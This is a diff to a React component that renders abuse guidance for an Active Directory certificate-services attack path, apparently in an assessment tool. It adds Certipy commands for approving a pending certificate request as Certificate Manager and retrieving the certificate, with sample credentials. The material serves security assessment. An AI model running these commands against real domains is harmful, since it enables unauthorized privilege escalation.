@@ -19,11 +19,25 @@ import { FC } from 'react';
 
 const Abuse: FC = () => {
     return (
-        <Typography variant='body2'>
-            This relationship alone is not enough to perform a privilege escalation or impersonation primitive. This
-            relationship may contribute to other relationships and attributes, from which an escalation opportunity may
-            emerge.
-        </Typography>
+        <>
+            <Typography variant='body2'>
+                An attacker can identify ADCS escalation opportunities where manager approval on the certificate
+                template prevents direct abuse, but leverage the Certificate Manager role to approve the pending
+                certificate request.
+            </Typography>
+            <Typography variant='body2'>
+                Certificate managers can approve pending certificate requests using Certipy:
+            </Typography>
+            <Typography component={'pre'}>
+                {"certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd"}
+            </Typography>
+            <Typography variant='body2'>Download the certificate with this command:</Typography>
+            <Typography component={'pre'}>
+                {
+                    'certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785'
+                }
+            </Typography>
+        </>
     );
 };
 
